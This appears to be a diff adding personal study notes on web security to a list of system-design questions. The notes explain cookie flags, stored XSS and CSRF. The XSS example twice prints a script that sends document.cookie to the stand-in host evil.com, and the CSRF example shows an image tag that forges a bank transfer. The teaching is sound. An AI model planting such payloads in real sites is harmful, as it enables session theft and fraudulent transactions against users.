@@ -51,4 +51,52 @@ Q. What are the different types of cache usage eg Read through , write through e
 Q. When to use memcachd vs redis vs HA etc
 Q. When to use CDN vs when to not ? 
 Q. Learn moer about HA mode in redis , how it works, what if it still fails for a usecase like url shortener
-Q.
+
+
+
+### Cookies
+A cookie is sent by the server with rules that tell the browser **when and where to send it back**. The **domain** restricts which website can receive the cookie, and the **path** restricts which URL prefixes on that site it applies to—so a single cookie can automatically be sent to **many endpoints**, not just one. The server fully controls the cookie’s **lifetime** (via expiry), **scope** (domain and path), and **security** using flags like `HttpOnly` (not accessible to JavaScript), `Secure` (HTTPS only), and `SameSite` (controls cross-site requests), while the browser simply stores the cookie and follows these rules.
+
+
+### XSS Attack (Cross-Site Scripting)
+XSS happens when an attacker injects malicious JavaScript into a website, and that script runs inside the victim’s browser as if it were trusted site code.
+example
+- Step 1: Backend stores this comment as plain text: "Nice article!"
+- Frontend renders:
+- <p>User comment: Nice article!</p> ✅ Safe.
+
+- Step 2: What the attacker submits instead
+- The attacker submits code, not text:
+```
+<script>
+  fetch("https://evil.com/steal?c=" + document.cookie)
+</script>
+```
+
+- The backend stores this as-is (this is the bug).
+
+- Step 3: What the victim’s browser receives
+- Later, a normal user opens the page.
+- The server sends HTML like this:
+```
+<p>User comment:
+  <script>
+    fetch("https://evil.com/steal?c=" + document.cookie)
+  </script>
+</p>
+```
+
+- ⚠️ This is now part of the page’s HTML.
+
+
+### CSRF Attack (Cross-Site Request Forgery)
+CSRF tricks a logged-in user’s browser into making a request they didn’t intend, using cookies that the browser automatically sends.
+example
+- User is logged into: bank.com
+- Bank uses cookies for auth.
+- User visits : evil.com
+- That page has: ** <img src="https://bank.com/transfer?amount=10000&to=attacker" /> **
+- Browser : Automatically sends bank cookies
+- Bank sees a valid authenticated request
+- Money is transferred 😬
+
